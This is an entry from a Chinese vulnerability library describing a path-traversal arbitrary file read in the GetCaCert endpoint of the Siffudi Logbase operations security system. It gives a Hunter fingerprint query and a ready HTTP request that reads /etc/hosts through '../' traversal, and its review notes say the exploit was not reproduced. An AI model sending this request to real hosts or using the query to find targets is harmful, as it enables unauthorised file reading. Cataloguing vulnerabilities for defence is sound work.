---
source: "wy876 漏洞文库"
title: "思福迪Logbase运维安全管理 GetCaCert a1路径遍历读取"
product: "思福迪Logbase运维安全管理"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "Linux hosts，版本未知"
prerequisites: "请求无Cookie，鉴权未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/wuf31x217y4a3dvr"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%80%9D%E7%A6%8F%E8%BF%AA/%E6%80%9D%E7%A6%8F%E8%BF%AA%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FGetCaCert%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
hunter: "app.name=\"Logbase 思福迪 运维安全系统\""
id: "vw-c0f7ced9240af068f50b81e1"
entity_id: "ve-c0f7ced9240af068f50b81e1"
schema_version: "1"
previous_fofa_unverified: "app.name="
---

# 思福迪Logbase运维安全管理 GetCaCert a1路径遍历读取

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：思福迪Logbase运维安全管理；GetCaCert a1路径遍历读取
- 版本、配置及部署条件：Linux hosts，版本未知
- 认证与权限前提：请求无Cookie，鉴权未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 只有读取hosts请求，无结果/路径约束/修复，不能泛全部文件
- Accept:gzip误将编码当媒体类型；Hunter抽入FOFA残缺
- 与qrcode不同机制，堡垒机产品分类保持一致

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
为满足用户对加强内部运维安全审计日益迫切的需要，杭州思福迪信息技术有限公司依托自身强大的研发能力，丰富的行业经验，自主研发了新一代软硬件一体化运维安全专用审计系统——Logbase运维安全管理系统。该系统支持对企业内部人员的维护行为进行全面的管理、审计，消除了传统审计系统中的盲点，使企业对运维人员的操作过程，能做到事前防范、事中控制、事后审计的能力，是企业IT内控最有效的运维管理平台。思福迪运维安全管理系统 GetCaCert存在任意文件读取漏洞。

## 二、影响版本
+ 思福迪运维安全管理系统

## 三、资产测绘
+ hunter`app.name="Logbase 思福迪 运维安全系统"`
+ 特征


## 四、漏洞复现
```http
GET /bhost/GetCaCert?a1=../../../../../etc/hosts HTTP/1.1
Host: 
Connection: close
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: gzip
Accept-Encoding: gzip, deflate, br
Content-Length: 0
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wuf31x217y4a3dvr>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
